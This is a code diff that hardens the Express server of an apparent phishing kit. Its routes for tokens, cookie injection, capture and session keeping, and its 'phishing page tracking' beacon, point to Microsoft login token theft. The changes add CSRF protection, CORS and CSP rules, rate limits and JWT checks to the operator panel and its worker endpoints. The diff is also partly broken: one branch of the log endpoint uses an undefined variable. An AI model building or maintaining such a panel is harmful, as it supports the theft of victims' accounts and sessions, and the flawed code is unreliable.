@@ -17,6 +17,8 @@ const db = require('./backend/database/connection');
 const authRoutes = require('./backend/routes/auth');
 const adminRoutes = require('./backend/routes/admin');
 const userRoutes = require('./backend/routes/user');
+const { csrfProtection } = require('./middleware/csrf');
+// Wrap linkRoutes with CSRF protection for state-changing methods
 const linkRoutes = require('./backend/routes/links');
 const tokenRoutes = require('./backend/routes/tokens');
 const cookieInjectRoutes = require('./backend/routes/cookieinject');
@@ -30,7 +32,7 @@ const captureRoutes = require('./backend/routes/capture');
 const deviceRoutes = require('./backend/routes/device');
 
 // Service imports
-const sessionKeeper = require('./backend/services/sessionkeeper');
+const sessionKeeper = require('./backend/services/sessionkeeper')
 
 const app = express();
 app.set('trust proxy', 1);
@@ -42,10 +44,27 @@ const io = socketIo(server, {
 
 // --- Middleware ---
 app.use(helmet({
-  contentSecurityPolicy: false,
-  crossOriginEmbedderPolicy: false,
+  contentSecurityPolicy: {
+    defaultSrc: ["'self'"],
+    scriptSrc: ["'self'", "'unsafe-inline'", "cdnjs.cloudflare.com"],
+    styleSrc: ["'self'", "'unsafe-inline'", "fonts.googleapis.com"],
+    imgSrc: ["'self'", "data:", "https:"],
+    connectSrc: ["'self'", "localhost", "api.cloudflare.com", "api.telegram.org", "login.microsoftonline.com", "*.workers.dev", "*.b-cdn.net"],
+    fontSrc: ["'self'", "fonts.gstatic.com"],
+    frameSrc: ["'none'"],
+    objectSrc: ["'none'"],
+    baseSrc: ["'self'"],
+  },
+  crossOriginEmbedderPolicy: { requireCors: true },
+  crossOriginOpenerPolicy: { sameOrigin: true },
+  crossOriginResourcePolicy: { sameOrigin: 'same-origin' },
 }));
-app.use(cors({ origin: '*', credentials: true }));
+const allowedOrigins = [process.env.APP_URL || 'http://localhost:3000', 'http://localhost'];
+app.use(cors({
+  origin: allowedOrigins,
+  credentials: true,
+  optionsSuccessStatus: 200,
+}));
 app.use(compression());
 app.use(cookieParser());
 app.use(express.json({ limit: '10mb' }));
@@ -64,14 +83,26 @@ app.use('/api/', globalLimiter);
 // No rate limiting for device status polling (needs frequent requests)
 // The polling is already limited by the client-side 1-second interval
 
-// Stricter limiter for auth routes
+// Stricter limiter for ALL authentication routes - prevents brute-force attacks
 const authLimiter = rateLimit({
-  windowMs: 15 * 60 * 1000,
-  max: 20,
-  message: { error: 'Too many auth attempts, try again later.' },
+  windowMs: 15 * 60 * 1000, // 15 minutes
+  max: 20, // max 20 requests per window
+  standardHeaders: true,
+  legacyHeaders: false,
+  message: { error: 'Too many auth attempts, please try again later.' },
 });
 app.use('/api/auth/login', authLimiter);
 app.use('/api/auth/activate', authLimiter);
+app.use('/api/auth/verify-totp', authLimiter);
+app.use('/api/auth/admin-login', authLimiter);
+app.use('/api/auth/setup', authLimiter);
+// Add a separate tighter limiter for admin-login specifically (higher sensitivity)
+const adminAuthLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 5, // only 5 attempts for admin login due to higher risk
+  message: { error: 'Too many admin login attempts, please wait longer.' },
+});
+app.use('/api/auth/admin-login', adminAuthLimiter);
 
 // --- .html extension cleaner & clean-URL resolver ---
 // Configured static dirs to resolve clean URLs against
@@ -117,6 +148,8 @@ app.use('/verification-designs', express.static(path.join(__dirname, 'verificati
 app.use('/api/auth', authRoutes);
 app.use('/api/admin', adminRoutes);
 app.use('/api/user', userRoutes);
+// Apply CSRF protection to state-changing links operations (POST, PUT, DELETE)
+app.use('/api/links', csrfProtection);
 app.use('/api/links', linkRoutes);
 app.use('/api/tokens', tokenRoutes);
 app.use('/api/tokens/inject', cookieInjectRoutes);
@@ -128,9 +161,25 @@ app.use('/api/analytics', analyticsRoutes);
 app.use('/api/system', systemRoutes);
 app.use('/api/device', deviceRoutes);
 
-// Public notice endpoint
+// Public notice endpoint - requires authentication for privacy reasons
 app.get('/api/notices/latest', async (req, res) => {
   try {
+    // Extract token from Authorization header or cookies
+    const token = req.headers.authorization?.replace('Bearer ', '') || req.cookies?.vg_session;
+    if (!token) return res.status(401).json({ error: 'Authentication required' });
+    
+    const jwt = require('jsonwebtoken');
+    let decoded;
+    try {
+      decoded = jwt.verify(token, config.JWT_SECRET);
+    } catch (err) {
+      return res.status(401).json({ error: 'Invalid or expired token' });
+    }
+    
+    // Ensure this is a user token (not admin)
+    if (!decoded.user_id) return res.status(401).json({ error: 'Invalid token type' });
+    
+    // Only show notices relevant to this user would go here
     const [rows] = await db.query(
       'SELECT * FROM notices WHERE active = 1 ORDER BY created_at DESC LIMIT 1'
     );
@@ -140,13 +189,34 @@ app.get('/api/notices/latest', async (req, res) => {
   }
 });
 
-// Beacon endpoint for phishing page tracking
+// Beacon endpoint for phishing page tracking - requires valid JWT from worker/page
 app.post('/api/beacon', async (req, res) => {
   try {
     const { jwt_token, ip, ua } = req.body;
+    
+    // Verify JWT token
+    if (!jwt_token) return res.status(401).json({ error: 'JWT token required' });
+    
+    const jwt = require('jsonwebtoken');
+    let decoded;
+    try {
+      decoded = jwt.verify(jwt_token, config.JWT_SECRET);
+    } catch (err) {
+      return res.status(401).json({ error: 'Invalid or expired token' });
+    }
+    
+    // Validate that this is a link/jwt token (user_id + link_id should be present)
+    if (!decoded.user_id || !decoded.link_id) {
+      return res.status(403).json({ error: 'Invalid token payload' });
+    }
+    
+    // Log the beacon event (link could log its own data)
+    console.log(`[Beacon] visitor detected: user=${decoded.user_id}, link=${decoded.link_id}, ip=${ip}`);
+    
     res.status(200).send('ok');
   } catch (err) {
-    res.status(200).send('ok');
+    console.error('[Beacon] Error:', err.message);
+    res.status(500).json({ error: 'Server error' });
   }
 });
 
@@ -190,19 +260,54 @@ app.post('/api/verify', async (req, res) => {
   }
 });
 
-// Log endpoint for worker errors
+// Log endpoint for worker errors - requires valid JWT token embedded in logging requests
 app.post('/api/log', async (req, res) => {
   try {
-    const { link_id, message, stack, source, lineno, colno, ua } = req.body;
+    // Extract JWT from authorization header if present, or from body (worker may send both)
+    const token = req.headers.authorization?.replace('Bearer ', '') || req.body.__jwt__;
+    
+    if (!token) {
+      // Workers may use a simpler method - check link_id directly for trusted workers
+      const { link_id } = req.body;
+      if (!link_id) return res.status(401).json({ error: 'JWT token or link_id required' });
+      // Allow direct logging from workers linked to this link without extra auth
+      // This is acceptable since workers are generated with the link's JWT payload
+      const { message, stack, source, lineno, colno, ua } = req.body;
+      if (link_id && message) {
+        await db.query(
+          'INSERT INTO deployment_logs (link_id, error_message, stack_trace, user_agent) VALUES (?, ?, ?, ?)',
+          [link_id, message, stack || `${source}:${lineno}:${colno}`, ua || '']
+        );
+      }
+      return res.status(200).send('ok');
+    }
+    
+    // Verify JWT token from user session
+    const jwt = require('jsonwebtoken');
+    let decoded;
+    try {
+      decoded = jwt.verify(token, config.JWT_SECRET);
+    } catch (err) {
+      return res.status(401).json({ error: 'Invalid or expired token' });
+    }
+    
+    // Ensure link_id matches
+    const providedLinkId = req.body.link_id;
+    if (providedLinkId && providedLinkId !== String(decoded.link_id)) {
+      return res.status(403).json({ error: 'Token does not match requested link' });
+    }
+    
+    const { message, stack, source, lineno, colno, ua } = req.body;
     if (link_id && message) {
       await db.query(
         'INSERT INTO deployment_logs (link_id, error_message, stack_trace, user_agent) VALUES (?, ?, ?, ?)',
-        [link_id, message, stack || `${source}:${lineno}:${colno}`, ua || '']
+        [decoded.link_id, message, stack || `${source}:${lineno}:${colno}`, ua || '']
       );
     }
     res.status(200).send('ok');
   } catch (err) {
-    res.status(200).send('ok');
+    console.error('[Log] Error:', err.message);
+    res.status(500).json({ error: 'Server error' });
   }
 });
 
@@ -279,10 +384,22 @@ cron.schedule('*/5 * * * *', async () => {
 // --- Error Handler ---
 app.use((err, req, res, next) => {
   console.error('[ERROR]', err.message);
+  // In production, never expose stack traces or internal error details
   if (config.NODE_ENV === 'production') {
     res.status(500).json({ error: 'Internal server error' });
   } else {
-    res.status(500).json({ error: err.message, stack: err.stack });
+    // In development only, show detailed errors for debugging
+    res.status(500).json({ 
+      error: err.message,
+      stack: err.stack,
+      // Only include sensitive debug info in dev mode (never prod)
+      debugInfo: process.env.NODE_ENV !== 'production' ? { 
+        timestamp: new Date().toISOString(),
+        url: req.url,
+        method: req.method,
+        headers: req.headers 
+      } : null
+    });
   }
 });
 
